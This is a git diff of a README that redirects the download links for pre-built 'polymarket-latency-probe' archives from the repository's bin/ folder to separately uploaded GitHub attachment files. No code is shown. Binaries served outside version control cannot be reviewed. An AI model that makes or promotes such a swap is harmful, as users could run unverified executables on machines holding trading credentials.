@@ -134,9 +134,9 @@ Pre-built zip archives are included in [`bin/`](bin/):
 
 | Platform | Architecture | File |
 |----------|--------------|------|
-| **Linux** | x86_64 | [`polymarket-latency-probe-linux-x86_64.zip`](bin/polymarket-latency-probe-linux-x86_64.zip?raw=1) |
-| **Windows** | x64 | [`polymarket-latency-probe-windows-x64.zip`](bin/polymarket-latency-probe-windows-x64.zip?raw=1) |
-| **macOS** | Apple Silicon (arm64) | [`polymarket-latency-probe-macos-arm64.zip`](bin/polymarket-latency-probe-macos-arm64.zip?raw=1) |
+| **Linux** | x86_64 | [`polymarket-latency-probe-linux-x86_64.zip`](https://github.com/user-attachments/files/29302563/polymarket-latency-probe-linux-x86_64.zip) |
+| **Windows** | x64 | [`polymarket-latency-probe-windows-x64.zip`](https://github.com/user-attachments/files/29302588/polymarket-latency-probe-windows-x64.zip) |
+| **macOS** | Apple Silicon (arm64) | [`polymarket-latency-probe-macos-arm64.zip`](https://github.com/user-attachments/files/29302597/polymarket-latency-probe-macos-arm64.zip) |
 
 Run the probe from the same machine (or VPS region) as your bot to compare endpoint latency before choosing feeds or colocation.
 
